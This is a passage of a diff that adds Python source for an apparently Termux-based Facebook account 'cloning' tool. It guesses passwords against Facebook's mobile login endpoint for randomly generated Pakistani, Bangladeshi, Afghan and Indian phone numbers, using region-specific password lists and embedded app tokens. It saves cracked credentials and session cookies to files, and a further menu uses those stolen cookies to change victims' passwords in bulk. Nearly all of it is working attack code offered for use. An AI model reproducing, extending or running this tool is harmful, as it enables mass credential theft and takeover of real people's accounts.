+			#self.password_menu(id)
+		#elif m_opt =="6":
+			#method.append('iiiiii')
+			#self.password_menu(id)
+		else:print(f"{W} [{R}+{W}] {W} WRONG SELECT ! ");sp(2);self.method_select(id)
+
+	def password_menu(self,id):
+		#check_again()
+		pwx=[]
+		logo()
+		max = 40
+		print(f"{W} [{R}+{W}] {W}EXAMPLE 5 , 10 , 20  to 40 Max ")
+		os.system('espeak -a 300 " Put,   Password,  ,Limit,"')
+		try:
+			plimit = int(input(f"{W} [{R}+{W}] {W}PASS LIMIT : "))
+			if plimit =="":
+				plimit = 4
+			elif plimit > max:
+				print(f"{W} [{R}+{W}] {W}PASS LIMIT UNDER 40 ");sp(2);self.password_menu()
+		except:
+			plimit = 4
+		logo()
+		print(f"{W} [{R}+{W}] {G}EX : first last First Last etc ")
+		line()
+		for n in range(plimit):
+			pwx.append(input(f"{W} [{R}+{W}] {W}PUT PASS %s : "%(n+1)))
+		logo()
+		os.system('espeak -a 300 " Process,   will  be,   Started,    ,Please  Wait,"')
+		line()
+		print(f"{W} [{R}+{W}] {W}TOTAL ACCOUNTS : \033[1;92m%s "%(str(len(id))))
+		print(f"{W} [{R}+{W}] {W}CRACKING START NOW....... ")
+		print(f"{W} [{R}+{W}] {R}USE FLIGHT MODE AFTER 5 MINTS! ")
+		line()
+		with NADEEMG(max_workers=30) as NADEEMgg:
+			for user in id:
+				uid = user.split("|")[0]
+				nm = user.split("|")[1]
+				if "i" in method:
+					NADEEMgg.submit(self.method1,uid,nm,pwx)
+				elif "ii" in method:
+					NADEEMgg.submit(self.method2,uid,nm,pwx)
+				#elif "iii" in method:
+					#NADEEMgg.submit(self.method3,uid,nm,pwx)
+				#elif "iiii" in method:
+					#NADEEMgg.submit(self.method4,uid,nm,pwx)
+				#elif "iiiii" in method:
+					#NADEEMgg.submit(self.method5,uid,nm,pwx)
+				#elif "iiiiii" in method:
+					#NADEEMgg.submit(self.method6,uid,nm,pwx)
+		self.saved_results(ok,cp)
+	def saved_results(self,ok,cp):
+		line()
+		os.system('espeak -a 300 " Process,   Completed,  ,Dear,"')
+		print(f"{W} [{R}+{W}] {W} PROCESS COMPLETE ")
+		print(f"{W} [{R}+{W}] {W} OK IDZ : \033[1;92m%s "%(len(ok)))
+		print(f"{W} [{R}+{W}] {W} CP IDZ : {R}%s "%(len(cp)))
+		line()
+		input(f"{W} [{R}+{W}] {W} PRESS ENTER TO BACK ")
+		self.iAmMenu()
+	def method1(self,uid,nm,pwx):
+		try:
+			global ok , cp , loop
+			sys.stdout.write(f'\r\r{W} [{R}NADEEM{W}]{R} %s{W} | {R}M1 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(ok),len(cp)));sys.stdout.flush()
+			fn = nm.split(' ')[0]
+			try:
+				ln = nm.split(' ')[1]
+			except:
+				ln = fn
+			for ps in pwx:
+				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
+				#ua1 = random.choice(M1)
+				#nip=random.choice(prox)
+				#proxs= {'http': 'socks5://'+nip}
+				data = {'adid': str(uuid.uuid4()),
+'format': 'json',
+'device_id': str(uuid.uuid4()),
+'cpl': 'true',
+'family_device_id': str(uuid.uuid4()),
+'credentials_type': 'device_based_login_password',
+'error_detail_type': 'button_with_disabled',
+'source': 'register_api',
+'email': uid,
+'password': pw,
+'access_token': '275254692598279|585aec5b4c27376758abb7ffcb9db2af',
+'generate_session_cookies': '1',
+'meta_inf_fbmeta': 'NO_FILE',
+'advertiser_id': str(uuid.uuid4()),
+'currently_logged_in_userid': '0',
+'locale': 'en_US',
+'client_country_code': 'US',
+'method': 'auth.login',
+'fb_api_req_friendly_name': 'authenticate',
+'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+'api_key': '882a8490361da98702bf97a021ddc14d',
+'sig': '1d2d2c81b7ac43af4db39465bf23e77e'}
+				headers={'Authorization': 'OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af',
+'X-FB-Net-HNI': '20083',
+'User-Agent': M1(),
+'X-FB-Client-IP': 'True',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-SIM-HNI': '37460',
+'X-Tigon-Is-Retry': 'False',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Connection-Quality': 'MOBILE.LTE',
+'X-FB-Server-Cluster': 'True',
+'Connection': 'keep-alive',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+'Host': 'graph.facebook.com',
+'X-FB-Connection-Bandwidth': '80025933',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'Accept-Encoding': 'gzip, deflate',
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'Content-Type': 'application/x-www-form-urlencoded'}
+				q = requests.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
+				if "session_key" in q:
+					#token = q["access_token"]
+					print(f'\r{G} [NADEEM-OK] %s | %s {W} '%(uid,pw))
+					os.system('espeak -a 300 " Crack,   Successfully,"')
+					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+					NADEEM1 = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NADEEM1};{ckkk}"
+					print(f'\r\033[1;92m [COOKIES] : '+cookie)
+					line()
+					#open('/sdcard/NADEEM/NADEEM-COOKIE_TOKEN.txt','a').write(cookie+'|'+token+'\n')
+					ok.append(uid)
+					open('/sdcard/NADEEM/NADEEM_M1_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/NADEEM/NADEEM_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+					break
+				elif 'www.facebook.com' in q['error']['message']:
+					#print(f'\r{R} [NADEEM-CP] %s | %s {W} '%(uid,pw))
+					cp.append(uid)
+					open('/sdcard/NADEEM/NADEEM_CP.txt','a').write(uid+'|'+pw+'\n')
+					break
+				else:
+					continue
+			loop+=1
+		except requests.exceptions.ConnectionError:
+			self.method1(uid,nm,pwx)
+		except Exception as e:
+			self.method1(uid,nm,pwx)
+	def method2(self,uid,nm,pwx):
+		try:
+			global ok , cp , loop
+			sys.stdout.write(f'\r\r{W} [{R}NADEEM{W}]{R} %s{W} | {R}M2 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(ok),len(cp)));sys.stdout.flush()
+			fn = nm.split(' ')[0]
+			try:
+				ln = nm.split(' ')[1]
+			except:
+				ln = fn
+			for ps in pwx:
+				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
+				#ua2 = random.choice(M2)
+				#nip=random.choice(prox)
+				#proxs= {'http': 'socks5://'+nip}
+				data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': uid,'password': pw,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
+				headers={'Host': 'graph.facebook.com','Content-Type': 'application/x-www-form-urlencoded','Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive','Priority': 'u=3, i','X-Fb-Sim-Hni': '45204','X-Fb-Net-Hni': '45201','X-Fb-Connection-Quality': 'GOOD','Zero-Rated': '0','User-Agent': M4(),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-Fb-Connection-Bandwidth': '24807555','X-Fb-Connection-Type': 'MOBILE.LTE','X-Fb-Device-Group': '5120','X-Tigon-Is-Retry': 'False','X-Fb-Friendly-Name': 'authenticate','X-Fb-Request-Analytics-Tags': 'unknown','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'True','X-Fb-Server-Cluster': 'True','Content-Length': '22'}
+				q = requests.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
+				if "session_key" in q:
+					#token = q["access_token"]
+					print(f'\r{G} [NADEEM-OK] %s | %s {W} '%(uid,pw))
+					os.system('espeak -a 300 " Crack,   Successfully,"')
+					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+					NADEEM1 = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NADEEM1};{ckkk}"
+					#print(f'\r\033[1;92m [COOKIES] : '+cookie)
+					#line()
+					#open('/sdcard/NADEEM/NADEEM-COOKIE_TOKEN.txt','a').write(cookie+'|'+token+'\n')
+					ok.append(uid)
+					open('/sdcard/NADEEM/NADEEM_M2_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/NADEEM/NADEEM_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+					break
+				elif 'www.facebook.com' in q['error']['message']:
+					#print(f'{P} [NADEEM-CP] %s | %s {W} '%(uid,pw))
+					cp.append(uid)
+					open('/sdcard/NADEEM/NADEEM_CP.txt','a').write(uid+'|'+pw+'\n')
+					break
+				else:
+					continue
+			loop+=1
+		except requests.exceptions.ConnectionError:
+			self.method2(uid,nm,pwx)
+		except Exception as e:
+			self.method2(uid,nm,pwx)
+	
+def Main_Menu():
+    clear()
+    print(f'{W} [{R}1{W}] {W}PAK CLONING\n{W} [{R}2{W}] {W}BD CLONING\n{W} [{R}3{W}] {W}AFG CLONING\n{W} [{R}4{W}] {W}INDIA CLONING\n{W} [{R}0{W}] {W}BACK MENU')
+    line()
+    option=input(f'{W} [{R}+{W}] {W}CHOICE MENU >> ')
+    if option in ['1','01']:
+        pak()
+    if option in ['2','02']:
+        bd()
+    if option in ['3','03']:
+        afg()
+    if option in ['4','04']:
+        ind()
+    if option in ['0','00']:
+    	iAmMain().iAmMenu()
+    else:
+    	line()
+    print(f'{W} [{R}+{W}] {W}SELECTED WRONG OPTION')
+    time.sleep(2)
+    Main_Menu()
+#####____Random-Method-Setup____#####
+def pak():
+                user=[]
+                clear()
+                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 0300,0315,0333,0345')
+                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
+                clear()
+                try:
+                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with NADEEMG(max_workers=60) as NADEEMg1:     
+                        clear()
+                        
+                        tl = str(len(user))
+                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
+                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
+                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
+                        line()
+                        for psx in user:
+                                ids = code+psx
+                                passlist=[psx,ids,'khan khan','khan1122','khan786','khankhan','malik123','kingkhan','baloch123','pak123','khan123','janjan','ali123','pakistan','pakistan786']
+                                NADEEMg1.submit(rd,ids,passlist)
+                print(f'\033[1;37m')
+                line()
+                print(f'{W} [{R}+{W}] {W}THE PROCESS HAS COMPLETED')
+                print(f'{W} [{R}+{W}] {W}TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
+                line()
+                input(f'{W} [{R}+{W}] {W}PRESS ENTER TO BACK ')
+                iAmMain().iAmMenu()
+def bd():
+                user=[]
+                clear()
+                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 017,016,018')
+                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
+                clear()
+                try:
+                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with NADEEMG(max_workers=60) as NADEEMg1:     
+                        clear()
+                        
+                        tl = str(len(user))
+                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
+                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
+                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
+                        line()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'i love you','iloveyou','free fire','freefire','57273200']
+                                NADEEMg1.submit(rd,ids,passlist)
+                print(f'\033[1;37m')
+                line()
+                print(f'{W} [{R}+{W}] {W} THE PROCESS HAS COMPLETED')
+                print(f'{W} [{R}+{W}] {W} TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
+                line()
+                input(f'{W} [{R}+{W}] {W} PRESS ENTER TO BACK ')
+                iAmMain().iAmMenu()
+
+def afg():
+                user=[]
+                clear()
+                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 9377,9379,9374')
+                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
+                clear()
+                try:
+                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with NADEEMG(max_workers=60) as NADEEMg1:     
+                        clear()
+                        
+                        tl = str(len(user))
+                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
+                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
+                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
+                        line()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
+                                NADEEMg1.submit(rd,ids,passlist)
+                print(f'\033[1;37m')
+                line()
+                print(f'{W} [{R}+{W}] {W}THE PROCESS HAS COMPLETED')
+                print(f'{W} [{R}+{W}] {W}TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
+                line()
+                input(f'{W} [{R}+{W}] {W}PRESS ENTER TO BACK ')
+                iAmMain().iAmMenu()
+def ind():
+                user=[]
+                clear()
+                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 91***,etc')
+                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
+                clear()
+                try:
+                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with NADEEMG(max_workers=60) as NADEEMgg:     
+                        clear()
+                        
+                        tl = str(len(user))
+                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
+                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
+                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
+                        line()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'57273200','hindustan','57575751']
+                                NADEEMgg.submit(rd,ids,passlist)
+                print(f'\033[1;37m')
+                line()
+                print(f'{W} [{R}+{W}] {W}THE PROCESS HAS COMPLETED')
+                print(f'{W} [{R}+{W}] {W}TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
+                line()
+                input(f'{W} [{R}+{W}] {W}PRESS ENTER TO BACK ')
+                iAmMain().iAmMenu()
+                
+def rd(uid,passlist):
+	try:
+		global ok,loop,sim_id
+		sys.stdout.write(f'\r\r{W} [{R}NADEEM{W}]%s|{R}RNDM{W}|\033[1;32mOK:%s\033[1;37m|{R}CP:%s\033[1;37m'%(loop,len(ok),len(cp)));sys.stdout.flush()
+		for pas in passlist:
+			data = {'adid': str(uuid.uuid4()),
+'format': 'json',
+'device_id': str(uuid.uuid4()),
+'family_device_id': str(uuid.uuid4()),
+'secure_family_device_id': str(uuid.uuid4()),
+'cpl': 'true',
+'try_num': '1',
+'email': uid,
+'password': pas,
+'method': 'auth.login',
+'generate_session_cookies': '1',
+'sim_serials': "['80973453345210784798']",
+'openid_flow': 'android_login',
+'openid_provider': 'google',
+'openid_emails': "['01710940017']",
+'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
+'error_detail_type': 'button_with_disabled',
+'source': 'account_recovery',
+'locale': 'en_GB',
+'client_country_code': 'GB',
+'fb_api_req_friendly_name': 'authenticate',
+'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
+			head = {'Host': 'graph.facebook.com',
+'Content-Type': 'application/x-www-form-urlencoded',
+'Accept-Encoding': 'gzip, deflate',
+'Connection': 'keep-alive',
+'Priority': 'u=3, i',
+'X-Fb-Sim-Hni': '45204',
+'X-Fb-Net-Hni': '45201',
+'X-Fb-Connection-Quality': 'GOOD',
+'Zero-Rated': '0',
+'User-Agent': M3(),
+'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+'X-Fb-Connection-Bandwidth': '24807555',
+'X-Fb-Connection-Type': 'MOBILE.LTE',
+'X-Fb-Device-Group': '5120',
+'X-Tigon-Is-Retry': 'False',
+'X-Fb-Friendly-Name': 'authenticate',
+'X-Fb-Request-Analytics-Tags': 'unknown',
+'X-Fb-Http-Engine': 'Liger',
+'X-Fb-Client-Ip': 'True',
+'X-Fb-Server-Cluster': 'True',
+'Content-Length': '847'}
+			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
+			if 'session_key' in po:
+				uid = str(po['uid'])
+				print(f'\r\033[1;32m [NADEEM-OK] '+uid+' | '+pas+'\033[1;37m')
+				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+				NADEEM1 = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NADEEM1};{ckkk}"
+				#print(f'\r\033[1;32m [COOKIES] :- '+cookie)
+				open('/sdcard/NADEEM/NADEEM-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
+				ok.append(uid)
+				break
+			elif 'www.facebook.com' in po['error']['message']:
+				uid = str(po['error']['error_data']['uid'])
+				print(f'\r{W} [NADEEM-CP] '+uid+' | '+pas+'\033[1;37m')
+				open('/sdcard/NADEEM/NADEEM-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
+				cp.append(uid)
+				break
+			else:
+				continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleeprint(20)
+	except Exception as e:
+		pass
+			
+
+class Grep:
+	def __init__(self):
+		logo()
+
+	def remove_links(self):
+	    os.system('clear');logo()
+	    os.system('espeak -a 300 " Enter,   File,  ,Name,"')
+	    file_path = input(f"{W} [{R}+{W}] {W}FILE PATH : ")
+	    with open(file_path, "r") as file:
+		    lines = file.readlines()
+	    with open(file_path, "w") as file:
+		    file.writelines(set(lines))
+	    line()
+	    print(f"{W} [{R}+{W}] {W}SUCCESSFULL REMOVED !\033[0m")
+	    print(f"{W} [{R}+{W}] {W}IDZ SAVED IN {file_path} \033[0m")
+	    line()
+	    input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK ")
+	    iAmMain().iAmMenu()
+
+	
+
+
+	def with_names(self):
+		logo()
+		os.system('espeak -a 300 " Enter,   File,  ,Name,"')
+		finput = input(f'{W} [{R}+{W}] {W}PUT FILE PATH :')
+		sav= input(f'{W} [{R}+{W}] {W}SAVE FILE PATH : ')
+		digits = input(f'{W} [{R}+{W}] {W}PUT DIGIT : ').split(',')
+		spc=[]
+		try:
+			file = open(finput,'r').read().splitlines()
+			xx = open(sav,'a')
+			for mix in file:
+				uid = mix.split('|')[0]
+				nm = mix.split('|')[1]
+				for digit in digits:
+					if digit in uid:
+						if uid not in spc:
+							if uid.startswith(digit):
+								xx.write(uid+'|'+nm+'\n')
+			print(f'{W} [{R}+{W}] {W}SEPRATE DONE!!!!!')
+			print(f'{W} [{R}+{W}] {W}YOUR FILE SAVED IN : %s '%(sav))
+			line()
+			input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK  ")
+			time.sleep(1)
+			iAmMain().iAmMenu()
+		except FileNotFoundError:
+			print(f'{W} [{R}+{W}] {W}FILE NOT FOUND !!!!')
+
+
+		
+class automation:
+	def __init__(self):
+		self.url = "https://free.facebook.com"
+	def menu(self):
+		logo()
+		print(f"{W} [{R}1{W}] {W}PASS CHANGE MENU ")
+		print(f'{W} [{R}2{W}] {W}CUT USED LINE ')
+		line()
+		am = input(f"{W} [{R}+{W}] {W}SELECT : ")
+		if am == "1":self.iAmPasswordManager()
+		elif am == "2":self.used_cutter()
+		else:
+			print(f"{W} [{R}+{W}] {W}WRONG SELECT!! ");sp(2);self.menu()
+	def used_cutter(self):
+		clear()
+		logo()
+		lines=[]
+		print(f"{W} [{R}+{W}] {W}\x1b[1;97mEX : /sdcard/file.txt")
+		try:
+			file = input(f"{W} [{R}+{W}] {W}\x1b[1;97mPUT FILE  : ")
+		except Exception as e:
+			print(f"{W} [{R}+{W}] {W}FILE NOT FOUND!! ");sp(2);self.used_cutter()
+		digit= int(input(f"{W} [{R}+{W}] {W}\x1b[1;97mPUT LINE :"))
+		with open(file,"r") as r:
+			lines = r.readlines()
+		with open(file,"w") as w:
+			for num,line in enumerate(lines):
+				if num >= digit:
+					w.write(line)
+		print(f"{W} [{R}+{W}] {W}REMOVED DONE")
+		iAmMain().iAmMenu()
+	def iAmPasswordManager(self):
+		logo()
+		print(f"{W} [{R}+{W}] {W}PASS CHANGE BY : NADEEM")
+		line()
+		print(f"{W} [{R}1{W}] {W}CHANGE PASS (BULK) \n{W} [{R}2{W}] {W} CHANGE PASS (SINGLE) \n{W} [{R}3{W}] {W} CHANGE PASS DEFAULT \n{W} [B]{W} PRESS ENTER TO BACK ")
+		line()
+		iamoption = input(f'{W} [{R}+{W}] {W}CHOSE : ')
+		if iamoption == '1':
+			self.bulk_password()
+		elif iamoption =='2':
+			self.single_password()
+		elif iamoption =='3':
+			self.change_default()
+		elif iamoption =='B':
+			iAmApprovelSystem()
+		else:
+			print(f"{W} [{R}+{W}] {W}WRONG SELECT ! ")
+			sp(2);self.iAmPasswordManager()
+	
+	def bulk_password(self):
+		sav = "/sdcard/NADEEM/NADEEM-Change-passwords.txt"
+		try:
+			iamdefaultpassword= open(".default_password.txt","r").read()
+		except FileNotFoundError:
+			iamdefaultpassword = "NADEEM786@##"
+		logo()
+		print(f"{W} [{R}+{W}] {W}PASS CHANGE BY : NADEEM")
+		line()
+		print(f"{W} [{R}+{W}] {W}DEFAULT PASS : %s "%(iamdefaultpassword))
+		line()
+		np = iamdefaultpassword
+		try:
+			file = input(f"{W} [{R}+{W}] {W}PUT FILE NAME : ")
+			id = open(file,"r").read().splitlines()
+		except FileNotFoundError:
+			print(f" [{G}+{W}] {W}FILE NOT FOUND ! ")
+			sp(2)
+			self.bulk_password()
+		logo()
+		print(f"{W} [{R}+{W}] {W}PASS CHANGE START NOW ! ")
+		line()
+		print(f"{W} [{R}+{W}] {W}TOTAL ACCOUNT : %s "%(len(id)))
+		line()
+		print(f"{W} [{R}+{W}] {W}PLEASE WAIT USE FAST INTERNET ")
+		line()
+		for x in id:
+			uid = x.split("|")[0]
+			pw = x.split('|')[1]
+			cok = x.split('|')[2]
+			cookies = {"cookie":cok}
+			
+			try:
+				r = requests.get('https://free.facebook.com',cookies=cookies).text.replace("amp;","")
+			except CE:
+				print(f"{W} [{R}+{W}] {W}YOUR INTERNET IS SO SLOW")
+			except Exception as e:
+				print(e)
+			if "/zero/optin/write/?" in r:
+				self.iAmFreeMode(cookies,r)
+			try:
+				r= requests.get("https://free.facebook.com/settings/security/password/?",cookies=cookies).text
+				r= r.replace("amp;","")
+			except CE:
+				print(f"{W} [{R}+{W}] {W}CHECK YOUR INTERNET UNEXPECTED STOP ! ")
+				exit()
+			
+			next = re.findall('action\="(.*?)"',r)[1]
+			data = {
+		"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
+		"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
+		"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
+	"password_old":pw,
+	"password_new":np,
+	"password_confirm":np,
+	"save": "Save changes"
+	}
+			po = requests.post("https://free.facebook.com"+str(next),cookies=cookies,data=data).text
+			po = po.replace("amp;","")
+			if 'Password changed' in po:
+				print(f"{W} [{R}+{W}] {W}✓PASS CHANGE SUCCESS : {W}%s "%(uid))
+				open(sav,"a").write(uid+'|'+np+'\n')
+			else:
+				print(f"{W} [{R}+{W}] {W}PASS CHANGE FAIL : {W}%s "%(uid))
+		line()
+		print(f"{W} [{R}+{W}] {W}PROCESS COMPLETE ! ")
+		print(f"{W} [{R}+{W}] {W}YOUR IDZ SAVED IN %s "%(sav))
+		line()
+		input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK ! ")
+		s(1)
+		self.iAmPasswordManager()
+		
+		
+	def single_password(self):
+		try:
+			iamdefaultpassword= open(".default_password.txt","r").read()
+		except FileNotFoundError:
+			iamdefaultpassword = "NADEEM786@##"
+		logo()
+		print(f"{W} [{R}+{W}] {W}PASS CHANGE BY : NADEEM ")
+		line()
+		print(f"{W} [{R}+{W}] {W}DEFAULT PASS : %s "%(iamdefaultpassword))
+		line()
+		np = iamdefaultpassword
